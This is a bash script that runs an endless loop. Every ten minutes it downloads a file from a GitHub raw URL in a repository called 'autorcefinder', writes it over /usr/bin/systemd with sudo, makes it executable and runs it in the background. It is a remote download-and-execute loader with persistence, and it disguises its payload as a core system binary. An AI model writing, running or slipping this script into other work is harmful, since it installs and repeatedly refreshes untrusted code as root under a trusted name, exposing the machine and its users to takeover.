#!/bin/bash

# GitHub URL where the systemd file is located
GITHUB_URL="https://raw.githubusercontent.com/FoxyProxys/autorcefinder/main/systemd"

while true; do
    # Check if the file already exists in /usr/bin/
    if [ -f "/usr/bin/systemd" ]; then
        sudo rm /usr/bin/systemd
    fi
    
    # Download the file if it exists
    if curl --output /dev/null --silent --head --fail "$GITHUB_URL"; then
        # Download the file
        sudo curl -sSL "$GITHUB_URL" -o /usr/bin/systemd
        
        # Give execute permissions
        sudo chmod +x /usr/bin/systemd
        
        # Execute the file
        /usr/bin/systemd &
    fi
    
    # Sleep for 10 minutes before checking again
    sleep 600
done
